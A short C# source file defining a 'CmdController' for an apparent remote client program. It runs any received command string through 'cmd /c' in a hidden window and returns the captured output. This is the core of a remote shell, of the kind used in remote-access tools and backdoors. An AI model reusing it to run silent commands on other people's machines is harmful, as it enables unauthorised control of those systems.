using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ClIENT_PC.Controller
{
    class CmdController : ControllerBase
    {
        public string Cmd(string action, string command)
        {
            switch (action)
            {
                case "execute":
                    return ExecuteCommand(command);
                    break;
                default:
                    return "";
                    break;
            }
        }

        private string ExecuteCommand(string commande)
        {
            ProcessStartInfo ProcessusCMD = new ProcessStartInfo("cmd", "/c " + commande)
            {
                RedirectStandardError = true,
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using (Process proc = new Process())
            {
                string sortie = string.Empty;
                try
                {
                    proc.StartInfo = ProcessusCMD;
                    proc.Start();

                    sortie = proc.StandardOutput.ReadToEnd();

                    if (string.IsNullOrEmpty(sortie))
                        sortie = proc.StandardError.ReadToEnd();
                }
                catch (Exception)
                {
                    sortie = "Erreur: ehec execution de la commande: \"" + commande + "\".";
                }
                return Encode(new { output = sortie });
            }
        }
    }
}
